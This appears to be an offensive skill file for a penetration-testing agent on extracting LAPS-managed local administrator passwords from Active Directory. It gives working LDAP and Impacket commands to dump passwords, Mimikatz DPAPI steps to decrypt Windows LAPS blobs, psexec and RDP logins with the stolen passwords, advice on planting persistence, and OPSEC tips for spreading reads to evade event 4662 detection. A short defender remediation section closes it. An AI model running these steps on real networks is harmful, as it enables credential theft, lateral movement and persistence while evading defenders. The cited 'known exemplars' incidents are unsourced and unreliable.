---
name: laps
description: Extract LAPS-managed local administrator passwords from AD computer objects (ms-Mcs-AdmPwd / msLAPS-Password).
metadata:
  subdomain: active-directory
  when_to_use: "laps local admin password ldap powerview netexec"
  mitre_attack:
    - T1555
---

# LAPS Password Extraction

LAPS (Local Administrator Password Solution) stores randomized local
admin passwords on computer objects in AD. Reading them requires
`ms-Mcs-AdmPwd` (legacy) or `msLAPS-Password` (Windows LAPS) read
permission — which is OFTEN over-delegated.

## 1. Detect LAPS deployment
```bash
# Legacy LAPS schema
ldapsearch -x -H ldap://DC_IP -D 'USER@DOM' -w 'PASS' \
  -b 'CN=Schema,CN=Configuration,DC=corp,DC=local' \
  '(name=ms-Mcs-AdmPwd)' name

# Windows LAPS (2023+)
ldapsearch ... '(name=msLAPS-Password)' name

# Either present = LAPS is deployed
```

## 2. Find delegated readers (your target ACL)
From BloodHound — anyone with `ReadLAPSPassword` edge:
```
MATCH (n)-[:ReadLAPSPassword]->(c:Computer)
RETURN DISTINCT n.name, c.name
```

Common over-delegation patterns:
- "HelpDesk-LAPS-Read" groups granted to ALL computers
- IT-Operations OUs reading their child OUs (then a flat OU = global)
- Service accounts with `GenericAll` on Computer objects (implies LAPS read)

## 3. Read passwords (assuming you can)
```bash
# Direct LDAP query as authorized user
ldapsearch -x -H ldap://DC_IP -D 'USER@DOM' -w 'PASS' \
  -b 'DC=corp,DC=local' \
  '(&(objectClass=computer)(ms-Mcs-AdmPwd=*))' \
  name dNSHostName ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime > /tmp/laps.txt

# Windows LAPS uses encrypted attribute by default
ldapsearch ... \
  '(&(objectClass=computer)(msLAPS-EncryptedPassword=*))' \
  name dNSHostName msLAPS-EncryptedPassword msLAPS-Password
```

**Impacket helper**:
```bash
# Recovers legacy LAPS
GetLAPSPassword.py 'DOM/USER:PASS@DC_FQDN' \
  -outputfile /tmp/laps.csv

# Newer Windows LAPS w/ encryption: use python-windows-laps or
# manual ASN.1 decode w/ user's DPAPI key
```

## 4. Bulk-process result
```
laps_ingest("/tmp/laps.txt")
```
This adds:
```
kg_add_node(kind="credential", label="<host>\\Administrator:<plain>",
            props={"source":"laps","host":"<host>","expires":"<date>"})
kg_add_edge(src=<cred>, dst=<computer>, kind="local-admin")
```

## 5. Cracking encrypted LAPS (Windows LAPS only)
Windows LAPS (server 2022+) encrypts the password with a per-principal
DPAPI key derived from the AD-stored public key. To decrypt:
- You need either the authorized principal's DPAPI master key (from their
  profile via Mimikatz `dpapi::masterkey`), or
- The recovery key configured via `Set-LAPSADAuditing` policy

If neither, the `msLAPS-EncryptedPassword` blob is useless without context.

## 6. Authentication with LAPS pw
```bash
# SMB / WMI as local admin
psexec.py 'HOST\\Administrator:LAPS_PW@10.0.0.5'
wmiexec.py 'HOST\\Administrator:LAPS_PW@10.0.0.5'

# RDP
xfreerdp /u:Administrator /p:'LAPS_PW' /v:10.0.0.5 +clipboard
```

NOTE: LAPS rotates on a schedule (default 30 days). Use the pw quickly
and grab a more durable foothold (cached creds, scheduled task,
service account hash).

## OPSEC
- LDAP search for `ms-Mcs-AdmPwd` attribute is **event 4662** on DC
  with object type Computer and `Properties` referencing the AdmPwd GUID
- Detection signature: 4662 reading large numbers of computer objects
  for the AdmPwd attribute = LAPS scrape in progress
- Spread reads over time, scope by OU not domain-wide

## CVSS
- Anyone in domain reading any LAPS pw: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` = 7.5
- Over-delegated to wide group reading hundreds of hosts: 9.0 (scope: Changed)

## Defender remediation
```powershell
# Audit who can read LAPS pw on a Computer object
Get-ACL "AD:CN=HOST,OU=Servers,DC=dom,DC=local" |
  Select -ExpandProperty Access |
  Where {$_.ObjectType -eq '<AdmPwd-GUID>'} |
  Format-Table IdentityReference, ActiveDirectoryRights

# Remove over-delegated readers
$acl = Get-ACL "AD:CN=HOST,..."
$ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(
  'DOM\HelpDeskGroup', 'ExtendedRight', 'Deny',
  '<AdmPwd-GUID>', 'Descendents', '<Computer-GUID>')
$acl.AddAccessRule($ace)
Set-ACL -Path "AD:CN=HOST,..." -AclObject $acl

# Or use the LAPS-shipped audit cmdlet
Find-AdmPwdExtendedRights -Identity 'OU=Servers,DC=dom,DC=local'
```

## Known exemplars
- 2018: HelpDeskTier1 group granted ReadLAPS at domain root by accident → entire estate compromised
- 2021: Tenable Nessus default service account had LAPS read via GenericAll
- 2023: Multiple ManageEngine deployments over-delegated LAPS to "AssetMgmt" service account
